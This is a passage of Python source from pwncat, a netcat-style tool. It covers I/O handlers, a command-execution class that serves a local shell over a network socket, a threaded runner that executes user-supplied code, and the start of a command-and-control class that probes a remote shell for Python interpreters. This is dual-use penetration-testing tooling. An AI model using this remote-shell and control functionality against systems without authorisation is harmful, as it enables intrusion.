                self.log.trace("Received: %s", repr(data))  # type: ignore
                # [send-on-eof] Append data
                if self.__opts.send_on_eof:
                    lines.append(data)
                else:
                    yield data
            # EOF or <Ctrl>+<d>
            else:
                # [send-on-eof] Dump data before quitting
                if lines and self.__opts.send_on_eof:
                    yield StringEncoder.encode("").join(lines)
                self.log.trace("STDIN-EOF signal RAISE in IOStdinStdout.producer")  # type: ignore
                self.ssig.raise_stdin_eof()

    def consumer(self, data):
        # type: (bytes) -> None
        """Print received data to stdout."""
        if self.__py3:
            sys.stdout.buffer.write(data)
        else:
            # For issues with flush (when using tail -F or equal) see links below:
            # https://stackoverflow.com/questions/26692284
            # https://docs.python.org/3/library/signal.html#note-on-sigpipe
            print(data, end="")

        try:
            sys.stdout.flush()
        except IOError:
            # Python flushes standard streams on exit; redirect remaining output
            # to devnull to avoid another broken pipe at shutdown
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    def interrupt(self):
        # type: () -> None
        """Stop function that can be called externally to close this instance."""
        # TODO: Does not work on windows as it has blocking read of stdin
        self.log.trace("STDIN-QUIT signal RAISE in IOStdinStdout.interrupt")  # type: ignore
        self.ssig.raise_stdin_quit()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_input_timeout(self):
        # type: () -> None
        """Throws a catchable EOFError exception for sys.stdin after timeout (Linux only)."""
        # rlist: wait until ready for reading
        # wlist: wait until ready for writing
        # xlist: wait for an exceptional condition
        if not select.select([sys.stdin], [], [], self.__opts.input_timeout)[0]:
            raise EOFError("timed out")

    def __stdin_israw(self):
        # type: () -> bool
        """Check if the terminal (STDIN) is set to raw mode."""
        # Non-posix systems (e.g. Windows) do not have a raw mode
        if self.__win:
            return False

        fild = sys.stdin.fileno()
        try:
            mode = termios.tcgetattr(fild)
        except termios.error:
            # Not a TTY
            return False

        # ICANON
        # https://linux.die.net/man/3/termios
        # The setting of the ICANON canon flag in c_lflag determines whether
        # the terminal is operating in canonical mode (ICANON set) or
        # noncanonical (raw) mode (ICANON unset). By default, ICANON set.
        return mode[tty.LFLAG] != (mode[tty.LFLAG] | termios.ICANON)  # type: ignore

    def __read_stdin(self):
        # type: () -> bytes
        """Returns input from STDIN."""
        # [1/3] (Windows) Normal/Raw mode
        if self.__win:
            if self.__py3:
                return sys.stdin.buffer.read()
            # Python 2 on Windows opens sys.stdin in text mode, and
            # binary data that read from it becomes corrupted on \r\n.
            # Setting sys.stdin to binary mode fixes that.
            if hasattr(os, "O_BINARY"):
                msvcrt.setmode(  # type: ignore
                    sys.stdin.fileno(),
                    os.O_BINARY,  # pylint: disable=no-member
                )
            return sys.stdin.read()  # type: ignore

        # [2/3] (Linux/Mac) Raw mode
        if self.__stdin_israw():
            # Issue #109
            # when pasting in term I donot get full line echo
            # To mitigate this, I'm disabling the select.select call on sys.stdin
            # self.__set_input_timeout()
            if self.__py3:
                return sys.stdin.buffer.read(1)
            return sys.stdin.read(1)  # type: ignore

        # [3/3] (Linux/Mac) Normal mode
        self.__set_input_timeout()
        if self.__py3:
            return sys.stdin.buffer.readline()
        return sys.stdin.readline()  # type: ignore


# -------------------------------------------------------------------------------------------------
# [6/11 IOCommand]: (5/5) IOCommand
# -------------------------------------------------------------------------------------------------
class IOCommand(IO):
    """Implement command execution functionality.

    Attributes:
        proc (subprocess.Popen): subprocess.Popen instance.
    """

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (InterruptHandler, DsIOCommand) -> None
        """Set specific options for this I/O module.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            opts (DsIOCommand): Custom module options.
        """
        super(IOCommand, self).__init__(ssig)
        self.__opts = opts
        self.log.debug("Setting '%s' as executable", self.__opts.executable)

        # Did we already run cleanup
        self.__cleaned_up = False

        # If we receive only one byte at a time, the remote end is most likely
        # in raw mode and we will also start sending one byte at a time.
        # This will be determined in the consumer and action is taken in
        # the producer.
        self.__remote_is_raw = False

        # Open executable to wait for commands
        env = os.environ.copy()
        try:
            self.proc = Popen(  # pylint: disable=consider-using-with
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=False,
                env=env,
            )
        except FileNotFoundError:
            self.log.error("Specified executable '%s' not found", self.__opts.executable)
            sys.exit(1)
        # Python-2 compat (doesn't have FileNotFoundError)
        except OSError:
            self.log.error("Specified executable '%s' not found", self.__opts.executable)
            sys.exit(1)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self, *args, **kwargs):
        # type: (Any, Any) -> Iterator[bytes]
        """Constantly ask for input.

        Yields:
            str: Data received from command output.
        """
        assert self.proc.stdout is not None
        while True:
            if self.ssig.has_command_quit():
                self.log.trace("COMMAND-QUIT signal ACK IOCommand.producer (1)")  # type: ignore
                self.__cleanup()
                return
            self.log.trace("Reading command output")  # type: ignore
            # Byte-wise reading is required to make it work for remote ends being in raw mode
            # However, the performance of self.proc.stdout.readline() is way faster.
            # To improve performance we will get rid of all other logging calls here.
            if self.__remote_is_raw:
                data = self.proc.stdout.read(1)
            else:
                data = self.proc.stdout.readline()
            self.log.trace("Command output: %s", repr(data))  # type: ignore
            if not data:
                if self.ssig.has_command_quit():
                    self.log.trace("COMMAND-QUIT signal ACK IOCommand.producer (2)")  # type: ignore
                    self.__cleanup()
                    return
                # This usually happens when sending a semicolon only to /bin/[ba]sh
                # which then responds with: /bin/sh: line 5: syntax error near unexpected token `;'
                # Afterwards the shell is corrupt and gone so we will restart it here.
                self.log.error("COMMAND-EOF restarting: %s", self.__opts.executable)
                self.proc = Popen(  # pylint: disable=consider-using-with
                    self.__opts.executable,
                    stdin=PIPE,
                    stdout=PIPE,
                    stderr=STDOUT,
                    bufsize=self.__opts.bufsize,
                    shell=False,
                    env=os.environ.copy(),
                )
                continue
            yield data

    def consumer(self, data):
        # type: (bytes) -> None
        """Send data received to stdin (command input).

        Args:
            data (str): Command to execute.
        """
        # If we only receive one byte at a time, also tell the consumer
        # to send one byte at a time immediately and not to wait for a full line.
        if len(data) == 1:
            self.__remote_is_raw = True
        else:
            self.__remote_is_raw = False

        assert self.proc.stdin is not None
        self.log.trace("Appending to stdin: %s", repr(data))  # type: ignore
        try:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        except BrokenPipeError:
            pass

    def interrupt(self):
        # type: () -> None
        """Stop function that can be called externally to close this instance."""
        self.log.trace("COMMAND-QUIT signal RAISED IOCommand.interrupt")  # type: ignore
        self.ssig.raise_command_quit()
        self.__cleanup()

    def __cleanup(self):
        # type: () -> None
        """Cleanup function."""
        if not self.__cleaned_up:
            self.log.trace(  # type: ignore
                "COMMAND-QUIT-CLEANUP: killing executable: %s with pid %d",
                self.__opts.executable,
                self.proc.pid,
            )
            self.proc.kill()
            self.__cleaned_up = True


# #################################################################################################
# #################################################################################################
# ###
# ###   7 / 11   P S E   S T O R E
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [7/11 PSE]: (1/1) PSEStore
# -------------------------------------------------------------------------------------------------
class PSEStore(object):
    """Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.

    The same instance of this class will be available to your send and receive scripts
    that allow you to exchange data or manipulate themselves. You even have access to the
    currently used instance of the networking class to manipulate the active socket.
    As well as to the logger and InterruptHandler instances.
    """

    @property
    def messages(self):
        # type: () -> Dict[str, List[bytes]]
        """`Dict[str, List[bytes]]`: Stores sent and received messages by its thread name."""
        return self.__messages

    @messages.setter
    def messages(self, value):
        # type: (Dict[str, List[bytes]]) -> None
        self.__messages = value

    @property
    def store(self):
        # type: () -> Any
        """`Any`: Custom data store to be used in PSE scripts to persist your data between calls."""
        return self.__store

    @store.setter
    def store(self, value):
        # type: (Any) -> None
        self.__store = value

    @property
    def ssig(self):
        # type: () -> InterruptHandler
        """`InterruptHandler`: Instance of InterruptHandler class."""
        return self.__ssig

    @property
    def net(self):
        # type: () -> List[IONetwork]
        """`IONetwork`: List of active IONetwork instances (client or server)."""
        return self.__net

    @property
    def log(self):
        # type: () -> logging.Logger
        """`Logging.logger`: Instance of Logging.logger class."""
        return self.__log

    def __init__(self, ssig, net):
        # type: (InterruptHandler, List[IONetwork]) -> None
        """Instantiate the PSE class.

        Args:
            ssig (InterruptHandler): Instance InterruptHandler.
            net (IONetwork): Instance of the current network class to manipulate the socket.
        """
        self.__messages = {}
        self.__store = None
        self.__ssig = ssig
        self.__net = net
        self.__log = logging.getLogger(__name__)


# #################################################################################################
# #################################################################################################
# ###
# ###   8 / 11   R U N N E R
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [8/11 IO RUNNER]: (1/2) InterruptHandler
# -------------------------------------------------------------------------------------------------
class InterruptHandler(object):
    """Pwncat interrupt handler.

    It allows all threads to raise various signal on certain actions,
    as well as to ask the Interrupt Handler what to do.
    The Interrupt handler will internally decide (based on pwncat's
    command line arguments) what to do.
    """

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, keep_open, no_shutdown):
        # type: (bool, bool) -> None
        """Instantiate InterruptHandler.

        Args:
            keep_open (bool): `--keep-open` command line argument.
            no_shutdown (bool): `--no-shutdown` command line argument.
        """
        self.__log = logging.getLogger(__name__)  # type: logging.Logger
        self.__keep_open = keep_open
        self.__no_shutdown = no_shutdown

        # Shutdown signals
        self.__terminate = False
        self.__sock_send_eof = False
        self.__sock_quit = False
        self.__stdin_quit = False
        self.__command_quit = False

        # Producers have received EOF
        self.__sock_eof = False
        self.__stdin_eof = False
        self.__command_eof = False

        def handler(signum, frame):  # type: ignore  # pylint: disable=unused-argument
            self.__log.trace("Ctrl+c caught.")  # type: ignore
            # logging.shutdown()
            self.raise_terminate()

        # Handle Ctrl+C
        # signal.signal(signal.SIGTERM, handler)
        signal.signal(signal.SIGINT, handler)

    # --------------------------------------------------------------------------
    # Ask for action
    # --------------------------------------------------------------------------
    def has_terminate(self):
        # type: () -> bool
        """`bool`: Switch to be checked if pwncat should be terminated."""
        return self.__terminate

    def has_sock_send_eof(self):
        # type: () -> bool
        """`bool`: Switch to be checked if the socket connection should be closed for sending."""
        return self.__sock_send_eof

    def has_sock_quit(self):
        # type: () -> bool
        """`bool`: Switch to be checked if the socket connection should be closed."""
        return self.__sock_quit

    def has_stdin_quit(self):
        # type: () -> bool
        """`bool`: Switch to be checked if the STDIN should be closed."""
        return self.__stdin_quit

    def has_command_quit(self):
        # type: () -> bool
        """`bool`: Switch to be checked if the command should be closed."""
        return self.__command_quit

    # --------------------------------------------------------------------------
    # Raise Termination signal
    # --------------------------------------------------------------------------
    def raise_terminate(self):
        # type: () -> None
        """Signal the application that Socket should be quit."""
        self.__log.trace("SIGNAL TERMINATE raised")  # type: ignore
        self.__terminate = True
        self.__sock_quit = True
        self.__stdin_quit = True
        self.__command_quit = True

    # --------------------------------------------------------------------------
    # Raise Socket signals
    # --------------------------------------------------------------------------
    def raise_sock_send_eof(self):
        # type: () -> None
        """Signal the application that Socket should be closed for sending."""
        # self.__log.trace("SIGNAL SOCK-CLOSE-SEND raised")  # type: ignore
        self.__sock_send_eof = True

    def raise_sock_eof(self):
        # type: () -> None
        """Signal the application that Socket has received EOF."""
        # self.__log.trace("SIGNAL SOCK-EOF raised")  # type: ignore
        self.__sock_eof = True
        self.raise_sock_quit()

    def raise_sock_quit(self):
        # type: () -> None
        """Signal the application that Socket should be quit."""
        # self.__log.trace("SIGNAL SOCK-QUIT raised")  # type: ignore
        self.__sock_quit = True
        self.raise_terminate()

    # --------------------------------------------------------------------------
    # Raise STDIN signals
    # --------------------------------------------------------------------------
    def raise_stdin_eof(self):
        # type: () -> None
        """Signal the application that STDIN has received EOF."""
        # self.__log.trace("SIGNAL STDIN-EOF raised")  # type: ignore
        self.__stdin_eof = True
        self.raise_stdin_quit()

    def raise_stdin_quit(self):
        # type: () -> None
        """Signal the application that STDIN should be quit."""
        # self.__log.trace("SIGNAL STDIN-QUIT raised")  # type: ignore
        self.__stdin_quit = True
        # If --no-shutdown or -keep-open is specified
        # pwncat will not invoke shutdown on a socket after seeing EOF on stdin
        if not (self.__no_shutdown or self.__keep_open):
            # No more data from stdin, we can tell the remote side we are done
            # by closing the socket for sending (they will receive an EOF).
            self.raise_sock_send_eof()

    # --------------------------------------------------------------------------
    # Raise COMMAND signals
    # --------------------------------------------------------------------------
    def raise_command_eof(self):
        # type: () -> None
        """Signal the application that Command has received EOF."""
        # self.__log.trace("SIGNAL COMMAND-EOF raised")  # type: ignore
        self.__command_eof = True
        self.raise_command_quit()

    def raise_command_quit(self):
        # type: () -> None
        """Signal the application that Command should be quit."""
        # self.__log.trace("SIGNAL COMMAND-QUIT raised")  # type: ignore
        self.__command_quit = True
        self.raise_terminate()


# -------------------------------------------------------------------------------------------------
# [8/11 IO RUNNER]: (2/2) Runner
# -------------------------------------------------------------------------------------------------
class Runner(object):
    """Runner class that takes care about putting everything into threads."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, fast_quit, pse):
        # type: (InterruptHandler, bool, PSEStore) -> None
        """Create a new Runner object.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            fast_quit (boo): On `True` do not join threads upon exit, just raise terminate and exit.
            pse (PSEStore): Pwncat Scripting Engine store.
        """
        self.log = logging.getLogger(__name__)

        # Dict of producer/consumer action to run in a thread.
        # Each list item will be run in its own thread
        self.__actions = {}  # type: Dict[str, DsRunnerAction]

        # Dict of timed function definition to run in a thread.
        # Each list item will be run in its own thread.
        self.__timers = {}  # type: Dict[str, DsRunnerTimer]

        # Dict of repeater function definition to run in a thread.
        # Each list item will be run in its own thread.
        self.__repeaters = {}  # type: Dict[str, DsRunnerRepeater]

        # A dict which holds the threads created from actions.
        # The name is based on the __actions name
        # {"name": "<thread>"}
        self.__threads = {}  # type: Dict[str, threading.Thread]

        self.__ssig = ssig
        self.__fast_quit = fast_quit
        self.__pse = pse

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def add_action(self, name, action):
        # type: (str, DsRunnerAction) -> None
        """Add a function to the producer/consumer thread pool runner.

        Args:
            name (str): The name for the added action (will be used for logging the tread name).
            action (DsRunnerAction): Instance of DSRunnerAction.
        """
        self.__actions[name] = action

    def add_timer(self, name, timer):
        # type: (str, DsRunnerTimer) -> None
        """Add a function to the timer thread pool runner.

        Args:
            name (str): The name for the added timer (will be used for logging the thread name).
            timer (DsRunnerTimer): Instance of DsRunnerTimer.
        """
        self.__timers[name] = timer

    def add_repeater(self, name, repeater):
        # type: (str, DsRunnerRepeater) -> None
        """Add a function to the repeater thread pool runner.

        Args:
            name (str): The name for the added repeater (will be used for logging the thread name).
            repeater (DsRunnerRepeater): Instance of DsRunnerRepeater.
        """
        self.__repeaters[name] = repeater

    def run(self):
        # type: () -> None
        """Run threaded pwncat I/O modules."""

        def run_action(
                name,  # type: str
                producer,  # type: DsCallableProducer
                consumer,  # type: Callable[[bytes], None]
                transformers,  # type: List[Transform]
                code,  # type: Optional[Union[str, bytes, CodeType]]
        ):
            # type: (...) -> None
            """Producer/consumer run function to be thrown into a thread.

            Args:
                name (str): Name for logging output.
                producer (function): A generator function which yields data.
                consumer (function): A callback which consumes data from the generator.
                transformers ([function]): List of transformer functions applied before consumer.
                code (ast.AST): User-supplied python code with a transform(data) -> str function.
            """
            self.log.trace("[%s] Producer Start", name)  # type: ignore
            for data in producer.function(*producer.args, **producer.kwargs):
                self.log.trace("[%s] Producer received: %s", name, repr(data))  # type: ignore

                # [1/3] Transform data before sending it to the consumer
                if transformers:
                    for transformer in transformers:
                        data = transformer.transform(data)
                    self.log.trace(  # type: ignore
                        "[%s] Producer data after transformers: %s", name, repr(data)
                    )

                # [2/3] Apply custom user-supplied code transformations
                if code is not None:
                    self.log.debug(
                        "[%s] Executing user supplied transform(data, pse) -> data function", name
                    )
                    pse = self.__pse
                    # Add current message to PSE store
                    if name in self.__pse.messages:
                        self.__pse.messages[name] = self.__pse.messages[name] + [data]
                    else:
                        self.__pse.messages[name] = [data]
                    # Execute script code
                    exec(code, {}, locals())  # pylint: disable=exec-used
                    data = locals()["transform"](data, pse)

                    self.log.trace(  # type: ignore
                        "[%s] Producer data after user supplied transformer: %s", name, repr(data)
                    )

                # [3/3] Consume it
                consumer(data)
            self.log.trace("[%s] Producer Stop", name)  # type: ignore

        def run_timer(name, action, intvl, ssig, *args, **kwargs):
            # type: (str, Callable[..., None], int, InterruptHandler, Any, Any) -> None
            """Timer run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called in a given intervall
                intvl (float):     Intervall at which the action function will be called
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """
            self.log.trace("[%s] Timer Start (exec every %f sec)", name, intvl)  # type: ignore
            time_last = int(time.time())
            while True:
                if ssig.has_terminate():
                    self.log.trace(  # type: ignore
                        "TERMINATE signal ACK for timer action [%s]", name
                    )
                    return
                time_now = int(time.time())
                if time_now > time_last + intvl:
                    self.log.debug("[%s] Executing timed function", time_now)
                    action(*args, **kwargs)
                    time_last = time_now  # Reset previous time
                time.sleep(0.1)

        def run_repeater(name, action, repeat, pause, ssig, *args, **kwargs):
            # type: (str, Callable[..., None], int, float, InterruptHandler, Any, Any) -> None
            """Repeater run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called
                repeat (int):      Repeat the function so many times before quitting
                pause (float):     Pause between repeated calls
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """
            cycles = 1
            self.log.trace("Repeater Start (%d/%d)", cycles, repeat)  # type: ignore
            while cycles <= repeat:
                if ssig.has_terminate():
                    self.log.trace(  # type: ignore
                        "TERMINATE signal ACK for repeater action [%s]", name
                    )
                    return
                self.log.debug("Executing repeated function (%d/%d)", cycles, repeat)
                action(*args, **kwargs)
                cycles += 1
                time.sleep(pause)

        # [1/3] Start available action in a thread
        for key in self.__actions:
            if self.__ssig.has_terminate():
                self.log.trace("TERMINATE signal ACK for Runner.run [1]: [%s]", key)  # type: ignore
                break
            # Create Thread object
            thread = threading.Thread(
                target=run_action,
                name=key,
                args=(
                    key,
                    self.__actions[key].producer,
                    self.__actions[key].consumer,
                    self.__actions[key].transformers,
                    self.__actions[key].code,
                ),
            )
            # Daemon threads are easier to kill
            thread.daemon = self.__actions[key].daemon_thread

            # Add delay if threads cannot be started
            delay = 0.0
            while True:
                if self.__ssig.has_terminate():
                    self.log.trace(  # type: ignore
                        "TERMINATE signal ACK for Runner.run [2]: [%s]", key
                    )
                    break
                try:
                    # Do not call any logging functions in here as it will
                    # cause a deadlock for Python2
                    # Start and break the loop upon success to go to the next thread to start
                    thread.start()
                    break
                except (RuntimeError, Exception):  # pylint: disable=broad-except
                    delay += 0.1
                    time.sleep(delay)  # Give the system some time to release open fd's
            self.__threads[key] = thread

        # [2/3] Start available timers in a thread
        for key in self.__timers:
            if self.__ssig.has_terminate():
                self.log.trace("TERMINATE signal ACK for Runner.run [2]: [%s]", key)  # type: ignore
                break
            # Create Thread object
            thread = threading.Thread(
                target=run_timer,
                name=key,
                args=(
                         key,
                         self.__timers[key].action,
                         self.__timers[key].intvl,
                         self.__timers[key].ssig,
                     )
                     + self.__timers[key].args,
                kwargs=self.__timers[key].kwargs,
            )
            thread.daemon = False
            thread.start()

        # [3/3] Start available repeaters in a thread
        for key in self.__repeaters:
            if self.__ssig.has_terminate():
                self.log.trace("TERMINATE signal ACK for Runner.run [3]: [%s]", key)  # type: ignore
                break
            # Create Thread object
            thread = threading.Thread(
                target=run_repeater,
                name=key,
                args=(
                         key,
                         self.__repeaters[key].action,
                         self.__repeaters[key].repeat,
                         self.__repeaters[key].pause,
                         self.__repeaters[key].ssig,
                     )
                     + self.__repeaters[key].args,
                kwargs=self.__repeaters[key].kwargs,
            )
            thread.daemon = False
            thread.start()

        def check_stop():
            # type: () -> bool
            """Stop threads."""
            # [1/2] Fast shutdown
            # For Python < 3.3 we are unable to detect Ctrl+c signal during thread.join()
            # in a fast loop. Also for port-scan we will have thousands of threads that need
            # to be joined and the signal handler is unable to abort the whole program during that
            # time. Outcome is it would take a few minutes to abort during port scan.
            # The fix is to use a "faster" method to kill the threads.
            # 1. The port scanner threads need to be started in daemon mode
            # 2. the fast_quit param to Runner() must be set to True
            if self.__fast_quit:
                if self.__ssig.has_terminate():
                    self.log.trace("Fast quit - shutting down.")  # type: ignore
                    return True

            # [2/2] Normal shutdown for non-daemon threads
            else:
                for key in self.__threads:
                    if not self.__threads[key].is_alive() or self.__ssig.has_terminate():
                        for interrupt in self.__actions[key].interrupts:
                            # [1/3] Call external interrupters
                            self.log.trace(  # type: ignore
                                "Call INTERRUPT: %s.%s() for %s",
                                getattr(interrupt, "__self__").__class__.__name__,
                                interrupt.__name__,
                                self.__threads[key].getName(),
                            )
                            interrupt()
                            # [2/3] All blocking events inside the threads are gone, now join them
                            try:
                                self.log.trace(  # type: ignore
                                    "Joining %s", self.__threads[key].getName()
                                )
                                # NOTE: The thread.join() operating will also block the signal
                                # handler if we try to join too many threads at once.
                                self.__threads[key].join()
                                self.log.trace(  # type: ignore
                                    "Joined %s", self.__threads[key].getName()
                                )
                            except RuntimeError:
                                pass
            # If all threads are done, also stop
            if all([not self.__threads[key].is_alive() for key in self.__threads]):
                self.log.trace("All threads dead - shutting down.")  # type: ignore
                return True
            return False

        while True:
            if check_stop():
                sys.exit(0)
            # Need a timeout to not skyrocket the CPU
            if sys.version_info < (3, 3):
                # Signal Handler in Python < 3.3 is broken and might not catch on
                # a too small timeout invervall
                time.sleep(0.5)
            else:
                time.sleep(0.01)


# #################################################################################################
# #################################################################################################
# ###
# ###   9 / 11   C O M M A N D   A N D   C O N T R O L   M O D U L E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [9/11 Command & Control]: (1/3) CNC Exception classes
# -------------------------------------------------------------------------------------------------
class CNCPythonNotFound(BaseException):
    """CNC Exception handler."""


# -------------------------------------------------------------------------------------------------
# [9/11 Command & Control]: (2/3) CNC
# -------------------------------------------------------------------------------------------------
class CNC(object):
    """Command and Control base class."""

    __PYTHON_PATHS = [
        "/usr/bin",
        "/usr/local/bin",
        "/usr/local/python/bin",
        "/usr/local/python2/bin",
        "/usr/local/python2.7/bin",
        "/usr/local/python3/bin",
        "/usr/local/python3.5/bin",
        "/usr/local/python3.6/bin",
        "/usr/local/python3.7/bin",
        "/usr/local/python3.8/bin",
        "/bin",
        "/opt/bin",
        "/opt/python/bin",
        "/opt/python2/bin",
        "/opt/python2.7/bin",
        "/opt/python3/bin",
        "/opt/python3.5/bin",
        "/opt/python3.6/bin",
        "/opt/python3.7/bin",
        "/opt/python3.8/bin",
    ]

    __PYTHON_NAMES = [
        "python3",
        "python",
        "python2",
        "python2.7",
        "python3.5",
        "python3.6",
        "python3.7",
        "python3.8",
    ]

    __COLORS = {"yellow": "\x1b[33;21m", "reset": "\x1b[0m"}

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def remote_python(self):
        # type: () -> str
        """Discovered absolute Python remote path."""
        return self.__remote_python

    @property
    def remote_py3(self):
        # type: () -> bool
        """Is remote version Python3? Else it is Python2."""
        return self.__remote_py3

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, network):
        # type: (IONetwork) -> None
        """Instantiate Command and Control class.

        Args:
            network (IONetwork): Instance of IONetwork

        Raises:
            CNCPythonNotFound: if remote Python binary path is not found.
        """
        self.__net = network
        self.__log = logging.getLogger(__name__)
        self.__py3 = sys.version_info >= (3, 0)  # type: bool

        # Along with the response the server might prefix/suffix data
        # such as a PS1 prompt (which might be send first or last with a newline)
        self.__remote_prefix = []  # type: List[bytes]
        self.__remote_suffix = []  # type: List[bytes]

        # Receive timeout value will be adjusted dynamically depending on the
        # speed of the server. We'll start high to allow for slow servers.
        self.__recv_timeout = 0.3
        self.__recv_rounds = 5
        self.__recv_times = []  # type: List[float]

        # [1/3] Check if there is data to be received first (e.g.: greeting)
        self.print_info("Checking if remote sends greeting...")
        greeting = self.send_recv(None, False, False)
        if greeting:
            self.print_raw(b"\n".join(greeting), True)

        # [2/3] Check if the remote sends a prefix with every reply
        self.__set_remote_prefix()

        # [3/3] Find potential Python versions
        if not self.__set_remote_python_path():
            self.print_info("No Python has been found. Aborting and handing over to current shell.")
            raise CNCPythonNotFound()

    # --------------------------------------------------------------------------
    # Print Functions
    # --------------------------------------------------------------------------
    def print_info(self, message=None, newline=True, erase=False):
        # type: (Optional[str], bool, bool) -> None
        """Print a message to the local screen to inform the user.

        Args:
            message (str): The message to print.
            newline (bool): Add a newline?
            erase (bool): Erase previously printed text on the same line.
        """
        end = "\n" if newline else ""
        prefix = "{}[PWNCAT CnC]{} ".format(self.__COLORS["yellow"], self.__COLORS["reset"])
        if message is None:
            message = ""
            prefix = ""

        if erase:
            print("\r" * 1024 + "{}{}".format(prefix, message), end=end)
            sys.stdout.flush()
        else:
            print("{}{}".format(prefix, message), end=end)
            sys.stdout.flush()

    def print_raw(self, message, newline):
        # type: (bytes, bool) -> None
        """Print a message to the local screen without color/prefix.

        Args:
            message (bytes): The message to print.
            newline (bool): Add a newline?
        """
        if self.__py3:
            end = b"\n" if newline else b""
            sys.stdout.buffer.write(b"".join([message, end]))
        else:
            end = "\n" if newline else ""  # type: ignore
            print(message, end=end)  # type: ignore

        # For issues with flush (when using tail -F or equal) see links below:
        # https://stackoverflow.com/questions/26692284
        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
        try:
            sys.stdout.flush()
        except IOError:
            # Python flushes standard streams on exit; redirect remaining output
            # to devnull to avoid another broken pipe at shutdown
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    # --------------------------------------------------------------------------
    # Network Functions
    # --------------------------------------------------------------------------
    def send(self, data):
        # type: (bytes) -> int
        """Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """
        return self.__net.net.send(data)

    def flush_receive(self):
        # type: () -> List[bytes]
        """Try to reveive everything which is currently being sent from remote.

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """
        self.print_info("Flushing receive buffer (this can take some time) ...")

        self.send(b"\n")
        data1 = self.send_recv(None, False, False)
        data2 = self.send_recv(None, False, False)

        self.print_info("Flushing receive buffer done.")
        return data1 + data2

    def send_recv(self, data, strip_suffix=True, strip_echo=False):
        # type: (Optional[bytes], bool, bool) -> List[bytes]
        """Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.

        Args:
            data (None|bytes): The data to send. If None, will skip sending.
            strip_suffix (bool): Strip remote suffix from received data?
            strip_echo (bool): Also remove 'data' from output if server has echo'ed it?

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """
        # [1/4] Send
        if data is not None:
            self.__net.net.send(data)

        # [2/4] Receive actual reply
        responses = []

        # Setup timer and current receive round
        time_start = datetime.now()
        curr_round = 0

        while curr_round < self.__recv_rounds:
            try:
                response = self.__net.net.receive()
            except socket.timeout:
                time.sleep(self.__recv_timeout)
                time_step = datetime.now()
                time_diff = time_step - time_start

                self.__log.trace(  # type: ignore
                    "Timeout: Receive timed out after %f sec in %d/%d rounds",
                    time_diff.total_seconds(),
                    curr_round + 1,
                    self.__recv_rounds,
                )
                curr_round += 1
            # On successful read, we can determine to adjust timings.
            else:
                time_end = datetime.now()
                time_diff = time_end - time_start

                self.__recv_times.append(time_diff.total_seconds())
                self.__log.trace(  # type: ignore
                    "Timeout: Receive took %f sec (avg: %f) to receive in %d/%d rounds",
                    time_diff.total_seconds(),
                    sum(self.__recv_times) / len(self.__recv_times),
                    curr_round + 1,
                    self.__recv_rounds,
                )

                # Retries were required
                prev_recv_timeout = self.__recv_timeout
                if curr_round > 1:
                    self.__recv_timeout += time_diff.total_seconds()
                # No retries requred
                else:
                    self.__recv_timeout = time_diff.total_seconds() / 2

                self.__log.trace(  # type: ignore
                    "Timeout: Previous recv timeout: %f sec -> new recv timeout: %f sec",
                    prev_recv_timeout,
                    self.__recv_timeout,
                )

                # Add response
                if response:
                    responses.append(response)

                # Reset the start time and round
                time_start = datetime.now()
                curr_round = 0

        # Return if already empty
        if not responses:
            return responses

        # Response could be in one of the below listed formats:
        # 1. response could be one line per element
        # 2. reposnse could be multiple lines per element
        # 3. response cloud be single characters per element
        # But we want to make sure that we always get one line per element,
        # so we normalize it

        # First: Join lines which do not have line endings
        self.__log.debug("Normalize recv before (1): %s", repr(responses))
        normalized = []
        has_eol = True
        for line in responses:
            if has_eol:
                normalized.append(line)
            else:
                normalized[-1] = normalized[-1] + line
            # Determine what to do next iteration
            if line.endswith(b"\r\n"):
                has_eol = True
            elif line.endswith(b"\n"):
                has_eol = True
            elif line.endswith(b"\r"):
                has_eol = True
            else:
                has_eol = False
        responses = normalized
        self.__log.debug("Normalize recv after  (1): %s", repr(responses))

        # Second: Separate lines which have line endings
        self.__log.debug("Normalize recv before (2): %s", repr(responses))
        normalized = []
        for line in responses:
            line = line.rstrip(b"\r\n")
            line = line.rstrip(b"\n")
            line = line.rstrip(b"\r")
            line = line.lstrip(b"\r\n")
